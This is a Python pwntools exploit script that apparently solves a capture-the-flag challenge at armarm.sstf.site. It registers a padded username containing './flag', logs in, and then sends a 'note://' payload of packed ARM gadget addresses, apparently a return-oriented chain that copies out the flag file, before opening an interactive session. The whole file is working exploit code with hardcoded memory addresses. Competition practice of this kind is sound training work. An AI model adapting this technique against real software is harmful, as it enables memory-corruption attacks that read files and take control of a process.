from pwn import *

#p = process("./SET/prob")
p = remote("armarm.sstf.site",31338)

def join(v1):
    p.recvuntil(">>")
    p.sendline("1")
    p.recvuntil("User: ")

    p.sendline(v1)
    p.recvuntil("Password: ")
    p.sendline("AAAABB")

def login(v1):
    p.recvuntil(">>")
    p.sendline("2")
    p.recvuntil("User: ")
    p.sendline(v1);
    p.recvuntil("Pass: ")
    p.sendline("AAAABB")
    p.recvuntil("success\n")

def keeplink(v1):
    p.recvuntil(">>")
    p.sendline("4")
    p.recvuntil("Write data: ")
    p.sendline("note://"+v1);

def show():
    p.recvuntil(">>")
    p.sendline("3")


def main():
    ID="./flag".rjust(92,"A")
    #ID="A"*92
    join(ID)
    login(ID)
    show()
    raw_input("explit!!")

    MEMCPY_R3=0x011D22AE +1
    PR=0x011D28CC
    NOTE_DB=0x011E30E8
    FLAG_STR=0x011E3150 + 74
    keeplink(p32(FLAG_STR)+p32(PR)+p32(NOTE_DB)+p32(MEMCPY_R3))

    p.interactive()

if __name__ =="__main__":
    main()
